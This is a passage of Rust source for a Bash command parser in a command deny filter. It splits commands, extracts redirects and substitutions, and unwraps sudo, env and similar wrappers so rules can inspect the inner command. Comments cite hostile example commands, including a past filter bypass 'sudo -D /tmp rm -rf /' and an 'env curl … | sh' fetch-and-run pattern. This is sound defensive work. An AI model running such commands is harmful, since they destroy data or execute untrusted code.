//! Minimal shell fact extraction.
//!
//! Splits a Bash command string into segments (`;`, `&&`, `||`),
//! pipelines (`|`), and per-command [`Argv`] (env assignments + head +
//! args). Quoting (`'`, `"`, `` ` ``) is honoured so that a separator
//! inside quotes does not split the command.
//!
//! Redirects (`>`, `>>`, `<`, `2>`, `&>`) are extracted into
//! [`Pipeline::redirects`] so rules can reason about where a pipeline's
//! output lands. Heredocs (`<<TAG`, `<<-TAG`) are detected and their
//! body is captured as a `Redirect` with `RedirectOp::Heredoc`.
//! Process substitution (`<(…)` / `>(…)`) sets
//! [`Bash::has_process_substitution`] and re-parses each body into
//! [`Argv::subst_argv`] alongside command substitution (`` `…` `` /
//! `$(…)`, ADR 0008 / ADR 0003 C). The surrounding word stays opaque.
//! Bodies are not mixed into wrapper [`Argv::inner_argv`]. Budget
//! exhaustion keeps the flag as a pessimistic-mode backstop without
//! clearing captured opacity.
//!
//! See `docs/design/architecture.md` §fact extraction.

/// A parsed Bash command line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Bash {
    pub segments: Vec<Pipeline>,
    /// `true` if the source contained a `` ` … ` `` or `$(…)` command
    /// substitution. Bodies are also re-parsed into [`Argv::subst_argv`]
    /// when nesting budget remains; the flag stays set so rules can
    /// still fall back to pessimistic co-occurrence when re-entry
    /// yields nothing.
    pub has_command_substitution: bool,
    /// `true` if the source contained any redirect operator
    /// (`>`, `>>`, `<`, `2>`, `&>`, `<<`, `<<-`). Per-pipeline targets
    /// live in [`Pipeline::redirects`].
    pub has_redirect: bool,
    /// `true` if the source contained a heredoc (`<<TAG` / `<<-TAG`).
    /// The body is captured in [`Pipeline::redirects`] as a
    /// [`Redirect`] with [`RedirectOp::Heredoc`].
    pub has_heredoc: bool,
    /// `true` if the source contained a process substitution
    /// (`<(…)` / `>(…)`). Bodies are also re-parsed into
    /// [`Argv::subst_argv`] when nesting budget remains (ADR 0003 C /
    /// 0008); the surrounding word stays opaque and the flag stays set
    /// as a pessimistic-mode backstop.
    pub has_process_substitution: bool,
}

/// One `;` / `&&` / `||`-bounded pipeline. Multiple commands inside are
/// joined by `|`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Pipeline {
    pub commands: Vec<Argv>,
    /// Redirect operators attached to this pipeline (e.g. `> file`,
    /// `>> log`, `<< EOF`). Per-command association is approximate —
    /// the lexer collects every redirect that appears in the pipeline
    /// text.
    pub redirects: Vec<Redirect>,
}

/// A redirect operator and its right-hand-side word.
///
/// For [`RedirectOp::Heredoc`] the `target` carries the heredoc body
/// (everything between the opening `<<TAG` line and the terminating
/// `TAG` line). For every other variant the `target` is the file path
/// or fd target word, with quoting stripped the same way [`Argv::args`]
/// strips it.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Redirect {
    pub op: RedirectOp,
    pub target: String,
}

/// Variant of a redirect operator. We collapse numeric fd forms into the
/// closest common shape — `1>`/`n>` → [`Stdout`](RedirectOp::Stdout),
/// `1>>`/`n>>` → [`StdoutAppend`](RedirectOp::StdoutAppend), `2>`/`2>>` →
/// [`Stderr`](RedirectOp::Stderr), `0<`/`n<` → [`Stdin`](RedirectOp::Stdin)
/// — since rules only need the rough direction, not the fd number. The fd
/// duplication form (`n>&m`, e.g. `2>&1`) is not yet modelled: its target
/// is an fd rather than a path, so it carries no path fact worth
/// surfacing.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RedirectOp {
    /// `>` — overwrite stdout to a file.
    Stdout,
    /// `>>` — append stdout to a file.
    StdoutAppend,
    /// `<` — read stdin from a file.
    Stdin,
    /// `2>` — overwrite stderr to a file.
    Stderr,
    /// `&>` — combined stdout+stderr to a file.
    Merge,
    /// `<<TAG` / `<<-TAG` — heredoc. `target` holds the body text.
    Heredoc,
}

/// A single command invocation.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Argv {
    /// Leading `KEY=VALUE` env assignments (e.g. `FOO=1 cmd ...`).
    pub env_assignments: Vec<EnvAssignment>,
    /// The command head (`rm`, `/bin/rm`, `sudo`, `curl`, ...).
    pub head: String,
    /// Remaining arguments (flags + positional).
    pub args: Vec<String>,
    /// Inner commands surfaced from wrappers such as `xargs`,
    /// `find -exec`, or `bash -c`.
    pub inner_argv: Vec<Self>,
    /// Inner code blobs carried by dynamic-eval wrappers. Rules that
    /// cannot inspect `inner_argv` directly can still surface these to
    /// users or audit.
    pub inner_code: Vec<String>,
    /// Redirects surfaced from inner shell code such as `bash -c
    /// 'echo hi > file'`. Kept separate from the outer pipeline so
    /// self-protection can inspect wrapped writes.
    pub inner_redirects: Vec<Redirect>,
    /// Substitution bodies (`$(…)` / `` `…` `` / `<(…)` / `>(…)`)
    /// re-parsed with the same bounded-depth engine as `bash -c`. Not
    /// mixed into [`Self::inner_argv`]: wrapper `-c` and subst shapes
    /// differ (ADR 0008 / ADR 0003 C).
    pub subst_argv: Vec<Self>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct EnvAssignment {
    pub key: String,
    pub value: String,
}

impl Argv {
    /// Iterate over arguments that look like flags (`-r`, `--recursive`).
    pub fn flags(&self) -> impl Iterator<Item = &str> {
        self.args.iter().filter(|a| is_flag(a)).map(String::as_str)
    }

    /// Iterate over positional (non-flag) arguments.
    pub fn positional(&self) -> impl Iterator<Item = &str> {
        self.args.iter().filter(|a| !is_flag(a)).map(String::as_str)
    }

    /// Final path component of the head, so absolute and relative
    /// invocations (`/usr/bin/curl`, `./curl`) compare equal to the bare
    /// name in rule head tables. `head` itself stays unnormalized.
    pub(crate) fn head_basename(&self) -> &str {
        head_basename(&self.head)
    }

    fn collect_commands<'a>(&'a self, out: &mut Vec<&'a Self>) {
        out.push(self);
        for inner in &self.inner_argv {
            inner.collect_commands(out);
        }
        for subst in &self.subst_argv {
            subst.collect_commands(out);
        }
    }
}

impl Bash {
    /// All surfaced commands, including nested wrapper payloads such as
    /// `bash -c`, `xargs`, `find -exec`, and substitution bodies
    /// (`$(…)` / backticks / `<(…)` / `>(…)`) in [`Argv::subst_argv`].
    pub fn commands(&self) -> Vec<&Argv> {
        let mut out = Vec::new();
        for pipe in &self.segments {
            for command in &pipe.commands {
                command.collect_commands(&mut out);
            }
        }
        out
    }
}

/// A value-taking option of a privilege-escalation wrapper. Modelling the
/// spelling as an enum — rather than an `(Option<char>, Option<&str>)`
/// pair — makes the "neither short nor long" state unrepresentable.
enum ValueFlag {
    /// Short-only spelling, e.g. `doas -a`.
    Short(char),
    /// Long-only spelling, e.g. `pkexec --user`.
    Long(&'static str),
    /// Both spellings, e.g. `sudo -u` / `sudo --user`.
    Both(char, &'static str),
}

impl ValueFlag {
    fn short(&self) -> Option<char> {
        match self {
            Self::Short(c) | Self::Both(c, _) => Some(*c),
            Self::Long(_) => None,
        }
    }

    fn long(&self) -> Option<&'static str> {
        match self {
            Self::Long(s) | Self::Both(_, s) => Some(*s),
            Self::Short(_) => None,
        }
    }
}

/// A prefix wrapper that runs an inner command after its own flags
/// (`sudo CMD`, `doas CMD`, `pkexec CMD`, `run0 CMD`, `env CMD`,
/// `command CMD`).
///
/// `su` is deliberately *not* a prefix wrapper: its payload is shell code
/// carried by `-c`, surfaced through `augment_inner_commands` instead.
struct PrefixWrapper {
    /// Wrapper command basename (`sudo`, `doas`, `pkexec`, `run0`, `env`,
    /// `command`).
    name: &'static str,
    /// Value-taking options, each listed exactly once in whichever
    /// spellings the wrapper accepts. A single source of truth keeps the
    /// short and long views symmetric by construction — the asymmetry
    /// this guards against was a real bypass (`sudo -D /tmp rm -rf /`).
    value_flags: &'static [ValueFlag],
}

impl PrefixWrapper {
    fn short_value_flag(&self, arg: &str) -> Option<char> {
        let flag = arg.strip_prefix('-')?.chars().next()?;
        self.value_flags
            .iter()
            .filter_map(ValueFlag::short)
            .any(|c| c == flag)
            .then_some(flag)
    }

    fn is_long_value_flag(&self, name: &str) -> bool {
        self.value_flags
            .iter()
            .filter_map(ValueFlag::long)
            .any(|long| long == name)
    }

    /// Whether inline `KEY=VALUE` assignments sit between this wrapper's
    /// flags and the inner command. Only `env FOO=bar CMD` does this; for
    /// every other wrapper such a token is the command head and must not
    /// be skipped.
    fn skips_env_assignments(&self) -> bool {
        self.name == "env"
    }
}

use ValueFlag::{Both, Long, Short};

/// `sudo` value-taking options (`sudo(8)`): complete and symmetric.
const SUDO_VALUE_FLAGS: &[ValueFlag] = &[
    Both('C', "close-from"),
    Both('c', "login-class"),
    Both('D', "chdir"),
    Both('g', "group"),
    Both('h', "host"),
    Both('p', "prompt"),
    Both('R', "chroot"),
    Both('r', "role"),
    Both('T', "command-timeout"),
    Both('t', "type"),
    Both('U', "other-user"),
    Both('u', "user"),
];

/// `doas` value-taking options (`doas(1)`): `doas` has no long options.
const DOAS_VALUE_FLAGS: &[ValueFlag] = &[Short('a'), Short('C'), Short('u')];

/// `pkexec` value-taking options (`pkexec(1)`): `--user` is the only one.
const PKEXEC_VALUE_FLAGS: &[ValueFlag] = &[Long("user")];

/// `run0` value-taking options (`run0(1)`), a conservative subset. The
/// `--key=value` spelling needs no entry — the inline-`=` branch handles
/// it — and unknown flags are assumed value-less, which surfaces the
/// inner command early (the safe direction for a deny filter).
const RUN0_VALUE_FLAGS: &[ValueFlag] = &[
    Both('u', "user"),
    Both('g', "group"),
    Both('D', "chdir"),
    Long("working-directory"),
    Long("setenv"),
    Long("machine"),
];

/// `env` value-taking options (`env(1)`). The valueless flags
/// (`-i`/`--ignore-environment`, `-0`/`--null`, `-v`) fall through the
/// "unknown flag = no value" path correctly, so only the ones that
/// consume the next token need listing.
const ENV_VALUE_FLAGS: &[ValueFlag] = &[
    Both('u', "unset"),
    Both('C', "chdir"),
    Both('S', "split-string"),
];

const PREFIX_WRAPPERS: &[PrefixWrapper] = &[
    PrefixWrapper {
        name: "sudo",
        value_flags: SUDO_VALUE_FLAGS,
    },
    PrefixWrapper {
        name: "doas",
        value_flags: DOAS_VALUE_FLAGS,
    },
    PrefixWrapper {
        name: "pkexec",
        value_flags: PKEXEC_VALUE_FLAGS,
    },
    PrefixWrapper {
        name: "run0",
        value_flags: RUN0_VALUE_FLAGS,
    },
    // `env FOO=bar CMD ...` runs CMD after its own flags and inline
    // assignments; unwrapping to CMD keeps `env curl … | sh` visible.
    PrefixWrapper {
        name: "env",
        value_flags: ENV_VALUE_FLAGS,
    },
    // `command CMD` runs CMD; its own `-p`/`-v`/`-V` are valueless. Even
    // the lookup-only `command -v curl` unwraps to `curl` — the deny-safe
    // over-approximation this filter prefers (cf. `RUN0_VALUE_FLAGS`).
    PrefixWrapper {
        name: "command",
        value_flags: &[],
    },
];

/// Return the command a prefix wrapper would execute.
///
/// Covers privilege escalators (`sudo`/`doas`/`pkexec`/`run0`) and the
/// POSIX command wrappers `env`/`command`, so `env curl ...` and
/// `command rm ...` unwrap to the real head rather than hiding it.
///
/// Each wrapper's common value-taking options are understood so
/// `sudo -u root git ...` unwraps to `git ...`, not to `root ...`, and
/// `env` additionally skips leading `KEY=VALUE` assignments
/// (`env FOO=bar curl ...` → `curl ...`). A full-path head
/// (`/usr/bin/sudo`, `/usr/bin/env`) matches on its basename; unknown
/// flags are assumed to take no value.
///
/// `su` is handled elsewhere: its payload is shell code in `-c`, surfaced
/// through `augment_inner_commands` as `inner_argv`. Chained wrappers
/// (`sudo env curl`) unwrap one layer per call — callers that need to see
/// through multiple layers loop (see `rules::git`).
pub(crate) fn unwrap_prefix_wrapper(argv: &Argv) -> Option<Argv> {
    let wrapper = PREFIX_WRAPPERS
        .iter()
        .find(|w| w.name == head_basename(&argv.head))?;

    let mut i = 0;
    while i < argv.args.len() {
        let arg = argv.args[i].as_str();
        if arg == "--" {
            i += 1;
            break;
        }
        if !arg.starts_with('-') || arg == "-" {
            // `env FOO=bar CMD` interposes inline assignments before the
            // command; skip them so the head lands on CMD, not `FOO=bar`.
            if wrapper.skips_env_assignments() && is_env_assignment(arg) {
                i += 1;
                continue;
            }
            break;
        }
        if let Some(flag) = arg.strip_prefix("--") {
            // `--flag VALUE` carries the value in the next token; the
            // `--flag=VALUE` form embeds it, so only the former skips ahead.
            if !flag.contains('=') && wrapper.is_long_value_flag(flag) {
                i += 1;
            }
            i += 1;
            continue;
        }
        if let Some(value_flag) = wrapper.short_value_flag(arg)
            && arg.len() == 2
            && arg.ends_with(value_flag)
        {
            i += 1;
        }
        i += 1;
    }

    let head = argv.args.get(i)?.clone();
    let rest = argv.args.iter().skip(i + 1).cloned().collect();
    Some(Argv {
        env_assignments: Vec::new(),
        head,
        args: rest,
        inner_argv: Vec::new(),
        inner_code: Vec::new(),
        inner_redirects: Vec::new(),
        subst_argv: Vec::new(),
    })
}

fn is_flag(a: &str) -> bool {
    a.starts_with('-') && a != "-" && a != "--"
}

/// Maximum depth for unrolling `bash -c` / `su -c` / `eval` / `xargs` /
/// `find -exec` inner payloads. See ADR 0002 (B3).
pub const NESTING_BUDGET: usize = 3;

/// Parse a raw Bash command string into a [`Bash`] structure.
///
/// Returns an empty `Bash` (no segments) for an entirely blank command.
pub fn parse(command: &str) -> Bash {
    parse_with_depth(command, NESTING_BUDGET)
}

fn parse_with_depth(command: &str, nesting_budget: usize) -> Bash {
    let TokenizeOutput {
        mut tokens,
        has_command_substitution,
        has_redirect,
        has_heredoc,
        has_process_substitution,
    } = tokenize(command);
    // Split in place: `split_mut` hands each `;` / `&&` / `||`-bounded
    // run to the parser as a subslice of the token vector, so a command
    // line with N words never holds two N-token buffers at once.
    // `parse_pipeline` moves the payloads out of the slots it visits.
    Bash {
        segments: tokens
            .split_mut(is_segment_separator)
            .filter(|segment| !segment.is_empty())
            .map(|segment| parse_pipeline(segment, nesting_budget))
            .filter(|p| !p.commands.is_empty() || !p.redirects.is_empty())
            .collect(),
        has_command_substitution,
        has_redirect,
        has_heredoc,
        has_process_substitution,
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    Word {
        text: String,
        /// Command-substitution bodies found inside this word.
        ///
        /// Boxed, and `None` rather than an empty collection, because
        /// the tokenizer materialises one `Token` per shell word: an
        /// inline `Vec<String>` widens *every* token by 16 bytes to
        /// carry a field that is empty for all but a handful of them.
        /// See `token_stays_small`.
        subst_bodies: SubstBodies,
    },
    Pipe,
    And,
    Or,
    Semi,
    Redirect(RedirectOp),
    HeredocBody(String),
}

/// Substitution bodies attached to a [`Token::Word`].
///
/// The extra indirection is deliberate — it is what keeps `Token` at 40
/// bytes instead of 56. See the field docs for why that matters.
type SubstBodies = Option<Box<Vec<String>>>;

/// Build a [`Token::Word`], dropping the substitution-body allocation
/// entirely for the common case of a word without any `$(…)` / `` `…` ``.
fn word_token(text: String, bodies: Vec<String>) -> Token {
    Token::Word {
        text,
        subst_bodies: (!bodies.is_empty()).then(|| Box::new(bodies)),
    }
}

/// Move `bodies` onto the substitution accumulator of the argv under
/// construction.
fn push_subst_bodies(dst: &mut Vec<String>, bodies: SubstBodies) {
    if let Some(bodies) = bodies {
        dst.extend(*bodies);
    }
}

struct TokenizeOutput {
    tokens: Vec<Token>,
    has_command_substitution: bool,
    has_redirect: bool,
    has_heredoc: bool,
    has_process_substitution: bool,
}

fn tokenize(s: &str) -> TokenizeOutput {
    let mut out = Vec::new();
    let mut saw_command_substitution = false;
    let mut saw_redirect = false;
    let mut saw_heredoc = false;
    let mut saw_process_substitution = false;
    let bytes = s.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        let c = bytes[i];
        if c.is_ascii_whitespace() {
            i += 1;
            continue;
        }
        if c == b'|' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'|' {
                out.push(Token::Or);
                i += 2;
            } else {
                out.push(Token::Pipe);
                i += 1;
            }
            continue;
        }
        if c == b'&' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'&' {
                out.push(Token::And);
                i += 2;
                continue;
            }
            if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                out.push(Token::Redirect(RedirectOp::Merge));
                saw_redirect = true;
                i += 2;
                continue;
            }
            // Lone `&` (background operator). ptuf does not model
            // background semantics; skip it so the lexer always makes
            // forward progress. Without this, `read_word` would return
            // (empty, 0 bytes) and `tokenize` would infinite-loop.
            i += 1;
            continue;
        }
        if c == b';' {
            out.push(Token::Semi);
            i += 1;
            continue;
        }
        // Heredoc: `<<TAG` or `<<-TAG` (must precede the bare `<` arm).
        if c == b'<' && i + 1 < bytes.len() && bytes[i + 1] == b'<' {
            let mut j = i + 2;
            if j < bytes.len() && bytes[j] == b'-' {
                j += 1;
            }
            while j < bytes.len() && (bytes[j] == b' ' || bytes[j] == b'\t') {
                j += 1;
            }
            let (tag, tag_len, _, _) = read_word(&bytes[j..]);
            if !tag.is_empty() {
                j += tag_len;
                let body = read_heredoc_body(&bytes[j..], &tag);
                out.push(Token::Redirect(RedirectOp::Heredoc));
                out.push(Token::HeredocBody(body.text));
                saw_redirect = true;
                saw_heredoc = true;
                i = j + body.consumed;
                continue;
            }
            // Empty tag: degrade gracefully and emit a plain `<` redirect
            // (consume the leading two `<` bytes only) so the loop still
            // makes forward progress.
            out.push(Token::Redirect(RedirectOp::Stdin));
            saw_redirect = true;
            i += 2;
            continue;
        }
        if c == b'<' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'(' {
                // Process substitution: fold into a word (opaque) and flag.
                // Bodies from nested $(…) inside <(…) still surface.
                let (word, advanced, word_subst, bodies) = read_word(&bytes[i..]);
                debug_assert!(advanced > 0, "read_word must consume at least one byte");
                if word_subst {
                    saw_command_substitution = true;
                }
                saw_process_substitution = true;
                out.push(word_token(word, bodies));
                i += advanced;
                continue;
            }
            out.push(Token::Redirect(RedirectOp::Stdin));
            saw_redirect = true;
            i += 1;
            continue;
        }
        if c == b'>' {
            if i + 1 < bytes.len() && bytes[i + 1] == b'(' {
                let (word, advanced, word_subst, bodies) = read_word(&bytes[i..]);
                debug_assert!(advanced > 0, "read_word must consume at least one byte");
                if word_subst {
                    saw_command_substitution = true;
                }
                saw_process_substitution = true;
                out.push(word_token(word, bodies));
                i += advanced;
                continue;
            }
            if i + 1 < bytes.len() && bytes[i + 1] == b'>' {
                out.push(Token::Redirect(RedirectOp::StdoutAppend));
                saw_redirect = true;
                i += 2;
            } else {
                out.push(Token::Redirect(RedirectOp::Stdout));
                saw_redirect = true;
                i += 1;
            }
            continue;
        }
        // Numeric fd redirect: a run of ASCII digits (the fd number) at a
        // word-start position, immediately followed by `>` or `<` — e.g.
        // `1>`, `1>>`, `0<`, `3>`, `10>`, `2>`, `2>>`. The whitespace skip
        // above guarantees we are at a word start. We only model rough
        // direction, so the fd number is discarded and the op collapses to
        // the closest common shape. A digit run *not* followed by a
        // redirect operator (e.g. `123`, `2foo`) falls through to
        // `read_word` and stays a plain word.
        if c.is_ascii_digit() {
            let mut d = i;
            while d < bytes.len() && bytes[d].is_ascii_digit() {
                d += 1;
            }
            // fd 2 collapses to Stderr; all other fds map by operator.
            let is_stderr = d - i == 1 && bytes[i] == b'2';
            if d < bytes.len() && bytes[d] == b'>' {
                let append = d + 1 < bytes.len() && bytes[d + 1] == b'>';
                let op = if is_stderr {
                    RedirectOp::Stderr
                } else if append {
                    RedirectOp::StdoutAppend
                } else {
                    RedirectOp::Stdout
                };
                out.push(Token::Redirect(op));
                saw_redirect = true;
                i = d + if append { 2 } else { 1 };
                continue;
            }
            // `n<` — single stdin redirect. Leave `n<<` (numeric-fd
            // heredoc, exceedingly rare) to fall through so we never
            // misparse a heredoc opener.
            let is_heredoc = d + 1 < bytes.len() && bytes[d + 1] == b'<';
            if d < bytes.len() && bytes[d] == b'<' && !is_heredoc {
                out.push(Token::Redirect(RedirectOp::Stdin));
                saw_redirect = true;
                i = d + 1;
                continue;
            }
        }
        // Otherwise: read a word, honouring quotes.
        let (word, advanced, word_subst, bodies) = read_word(&bytes[i..]);
        // Forward-progress invariant: every separator and whitespace
        // byte is consumed above, so `read_word` is always called on a
        // non-trivial first byte and must advance by at least 1. The
        // assertion documents this; if a future change adds a code path
        // that returns 0, debug builds fail fast instead of looping.
        debug_assert!(advanced > 0, "read_word must consume at least one byte");
        if word_subst {
            saw_command_substitution = true;
        }
        out.push(word_token(word, bodies));
        i += advanced;
    }
    TokenizeOutput {
        tokens: out,
        has_command_substitution: saw_command_substitution,
        has_redirect: saw_redirect,
        has_heredoc: saw_heredoc,
        has_process_substitution: saw_process_substitution,
    }
}

struct HeredocBody {
    text: String,
    consumed: usize,
}

/// Read a heredoc body that opened with `<<TAG`. The body runs from the
/// next byte after the tag (which is expected to be a newline) up to a
/// line that contains exactly `TAG`. If no terminator is found the rest
/// of the input is consumed.
fn read_heredoc_body(bytes: &[u8], tag: &str) -> HeredocBody {
    let mut i = 0;
    if i < bytes.len() && bytes[i] == b'\n' {
        i += 1;
    }
    let body_start = i;
    let tag_bytes = tag.as_bytes();
    while i < bytes.len() {
        let line_start = i;
        // Heredoc-`<<-` strips leading tabs from the closing tag and
        // body lines; we accept either form as terminator without
        // distinguishing the two operators in surfaced facts.
        let mut probe = line_start;
        while probe < bytes.len() && bytes[probe] == b'\t' {
            probe += 1;
        }
        if bytes.len() - probe >= tag_bytes.len()
            && &bytes[probe..probe + tag_bytes.len()] == tag_bytes
        {
            let after_tag = probe + tag_bytes.len();
            let line_end_is_terminator = after_tag == bytes.len() || bytes[after_tag] == b'\n';
            if line_end_is_terminator {
                let body_text = std::str::from_utf8(&bytes[body_start..line_start])
                    .unwrap_or("")
                    .to_string();
                let consumed = if after_tag < bytes.len() {
                    after_tag + 1
                } else {
                    after_tag
                };
                return HeredocBody {
                    text: body_text,
                    consumed,
                };
            }
        }
        // Advance to next line.
        while i < bytes.len() && bytes[i] != b'\n' {
            i += 1;
        }
        if i < bytes.len() {
            i += 1;
        }
    }
    let body_text = std::str::from_utf8(&bytes[body_start..])
        .unwrap_or("")
        .to_string();
    HeredocBody {
        text: body_text,
        consumed: bytes.len(),
    }
}

/// Read a single shell "word" starting at `bytes[0]`. Quoted spans
/// (`'`, `"`, `` ` ``) are absorbed into the word with their delimiters
/// stripped. Returns the decoded word, the number of bytes consumed,
/// and a flag set when the word contained a `` ` `` or `$(` command
/// substitution opening.
///
/// The caller is expected to skip whitespace and the separator bytes
/// (`|`, `&`, `;`) before calling — under that contract this function
/// always consumes at least one byte.
fn read_word(bytes: &[u8]) -> (String, usize, bool, Vec<String>) {
    let mut buf = String::new();
    let mut i = 0;
    let mut saw_subst = false;
    let mut bodies = Vec::new();
    while i < bytes.len() {
        let c = bytes[i];
        if c.is_ascii_whitespace() {
            break;
        }
        if matches!(c, b'|' | b'&' | b';') {
            break;
        }
        if c == b'\\' && i + 1 < bytes.len() {
            buf.push(bytes[i + 1] as char);
            i += 2;
            continue;
        }
        // Process substitution `<(…)` / `>(…)`: absorb the entire
        // parenthesised group as opaque text and capture the body for
        // subst_argv re-parse (ADR 0003 C / 0008). Without this, an
        // inner `|` would terminate the word mid-expression.
        if (c == b'<' || c == b'>') && i + 1 < bytes.len() && bytes[i + 1] == b'(' {
            buf.push(c as char);
            buf.push('(');
            i += 2;
            absorb_parens(bytes, &mut i, &mut buf, Some(&mut bodies));
            continue;
        }
        // Unquoted `$(…)`: balance-absorb and capture body (ADR 0008).
        if c == b'$' && i + 1 < bytes.len() && bytes[i + 1] == b'(' {
            saw_subst = true;
            buf.push('$');
            buf.push('(');
            i += 2;
            absorb_parens(bytes, &mut i, &mut buf, Some(&mut bodies));
            continue;
        }
        if c == b'\'' || c == b'"' || c == b'`' {
            if c == b'`' {
                // Backtick command substitution: absorb to closing `
                // (or EOF) and capture the body.
                saw_subst = true;
                i += 1;
                let body_start = i;
                while i < bytes.len() && bytes[i] != b'`' {
                    if bytes[i] == b'\\' && i + 1 < bytes.len() {
                        buf.push(bytes[i + 1] as char);
                        i += 2;
                        continue;
                    }
                    push_latin1(&mut buf, &bytes[i..=i]);
                    i += 1;
                }
                let body = latin1_slice(&bytes[body_start..i]);
                if !body.is_empty() {
                    bodies.push(body);
                }
                if i < bytes.len() {
                    i += 1; // closing backtick
                }
                continue;
            }
            let quote = c;
            i += 1;
            while i < bytes.len() && bytes[i] != quote {
                if quote == b'"' && bytes[i] == b'\\' && i + 1 < bytes.len() {
                    buf.push(bytes[i + 1] as char);
                    i += 2;
                    continue;
                }
                // `$(` inside a double-quoted span is still a command
                // substitution — balance-absorb and capture the body.
                if quote == b'"' && bytes[i] == b'$' && i + 1 < bytes.len() && bytes[i + 1] == b'('
                {
                    saw_subst = true;
                    buf.push('$');
                    buf.push('(');
                    i += 2;
                    absorb_parens(bytes, &mut i, &mut buf, Some(&mut bodies));
                    continue;
                }
                // Copy the maximal quoted run in one span: everything up
                // to the closing quote, or (inside `"`) the next escape /
                // substitution byte that needs per-byte handling above.
                let run = i;
                i += 1;
                let stop = if quote == b'"' {
                    memchr::memchr3(quote, b'\\', b'$', &bytes[i..])
                } else {
                    memchr::memchr(quote, &bytes[i..])
                };
                i += stop.unwrap_or(bytes.len() - i);
                push_latin1(&mut buf, &bytes[run..i]);
            }
            if i < bytes.len() {
                i += 1; // closing quote
            }
            continue;
        }
        // Plain run: extend to the next byte that needs special handling
        // and copy the whole span instead of one byte at a time.
        let run = i;
        i += 1;
        i += plain_run_len(&bytes[i..]);
        push_latin1(&mut buf, &bytes[run..i]);
    }
    (buf, i, saw_subst, bodies)
}

/// Length of the leading run of plain word bytes (see
/// [`is_plain_word_byte`]). Typical tokens end within the bytewise
/// prefix scan; pathological megabyte words fall through to `memchr`
/// SIMD sweeps over the 15-byte special set (five triples).
fn plain_run_len(bytes: &[u8]) -> usize {
    let quick = bytes.len().min(64);
    let mut i = 0;
    while i < quick {
        if !is_plain_word_byte(bytes[i]) {
            return i;
        }
        i += 1;
    }
    if i >= bytes.len() {
        return i;
    }
    let rest = &bytes[i..];
    let mut end = rest.len();
    for &(a, b, c) in &[
        (b' ', b'\t', b'\n'),
        (b'\r', 0x0c, b'|'),
        (b'&', b';', b'\\'),
        (b'<', b'>', b'$'),
        (b'\'', b'"', b'`'),
    ] {
        if let Some(p) = memchr::memchr3(a, b, c, &rest[..end]) {
            end = p;
        }
    }
    i + end
}

/// True when the byte can only ever be folded into the current word
/// verbatim — i.e. none of the `read_word` loop's special cases
/// (terminators, escapes, quotes, substitution / redirection openers)
/// can apply to it. Non-ASCII bytes are plain: they carry no shell
/// syntax and decode via [`push_latin1`].
const fn is_plain_word_byte(b: u8) -> bool {
    !(b.is_ascii_whitespace()
        || matches!(
            b,
            b'|' | b'&' | b';' | b'\\' | b'<' | b'>' | b'$' | b'\'' | b'"' | b'`'
        ))
}

/// Append raw bytes to `buf`, preserving the historical `byte as char`
/// decoding (each byte read as its Latin-1 code point): all-ASCII spans
/// — the overwhelmingly common case — are copied as one `str`, anything
/// containing a non-ASCII byte is widened one byte at a time. The
/// `from_utf8` on an all-ASCII span is infallible; the `Ok` guard
/// exists only to avoid `unwrap` under the workspace lint policy.
fn push_latin1(buf: &mut String, bytes: &[u8]) {
    if bytes.is_ascii() {
        if let Ok(s) = std::str::from_utf8(bytes) {
            buf.push_str(s);
        }
        return;
    }
    for &b in bytes {
        buf.push(b as char);
    }
}

/// Balance-absorb a parenthesised group. `*i` points at the first byte
/// *after* the opening `(`. Appends through the matching `)` into `buf`.
/// When `bodies` is `Some`, also pushes the inner slice for subst re-entry.
fn absorb_parens(bytes: &[u8], i: &mut usize, buf: &mut String, bodies: Option<&mut Vec<String>>) {
    let body_start = *i;
    let mut depth: usize = 1;
    while *i < bytes.len() && depth > 0 {
        let run = *i;
        *i += memchr::memchr2(b'(', b')', &bytes[*i..]).unwrap_or(bytes.len() - *i);
        push_latin1(buf, &bytes[run..*i]);
        if *i >= bytes.len() {
            break;
        }
        let pc = bytes[*i];
        if pc == b'(' {
            depth += 1;
        } else {
            depth -= 1;
            if depth == 0 {
                if let Some(bodies) = bodies {
                    let body = latin1_slice(&bytes[body_start..*i]);
                    if !body.is_empty() {
                        bodies.push(body);
                    }
                }
                buf.push(')');
                *i += 1;
                break;
            }
        }
        buf.push(pc as char);
        *i += 1;
    }
}

/// Decode a byte slice the same way [`push_latin1`] appends — ASCII as
/// one `str`, otherwise Latin-1 widening — into an owned `String`.
fn latin1_slice(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len());
    push_latin1(&mut s, bytes);
    s
}

/// `;` / `&&` / `||` end the current pipeline. ptuf models neither the
/// conditional semantics nor the ordering, so all three split alike.
fn is_segment_separator(tok: &Token) -> bool {
    matches!(tok, Token::And | Token::Or | Token::Semi)
}

/// Parse one `;` / `&&` / `||`-bounded run of tokens into a [`Pipeline`].
///
/// Takes `&mut [Token]` rather than an owned vector so the caller can
/// slice the single token buffer in place. Each visited slot is emptied
/// with [`std::mem::replace`], which both hands ownership of the payload
/// to this function and releases the borrow before the redirect arm
/// looks ahead at the following slot.
fn parse_pipeline(tokens: &mut [Token], nesting_budget: usize) -> Pipeline {
    let mut commands = Vec::new();
    let mut redirects = Vec::new();
    // `words` doubles as the argv buffer: `parse_argv` consumes it
    // without copying, so a word's `String` is allocated once by the
    // tokenizer and then only moved.
    let mut words: Vec<String> = Vec::new();
    let mut subst_bodies: Vec<String> = Vec::new();
    let mut cursor = 0;
    while cursor < tokens.len() {
        match std::mem::replace(&mut tokens[cursor], Token::Semi) {
            Token::Word {
                text,
                subst_bodies: bodies,
            } => {
                words.push(text);
                push_subst_bodies(&mut subst_bodies, bodies);
                cursor += 1;
            },
            Token::Pipe => {
                if !words.is_empty() {
                    commands.push(parse_argv(
                        std::mem::take(&mut words),
                        std::mem::take(&mut subst_bodies),
                        nesting_budget,
                    ));
                }
                cursor += 1;
            },
            Token::Redirect(op) => {
                let target =
                    take_redirect_target(tokens, &mut cursor, op, &mut words, &mut subst_bodies);
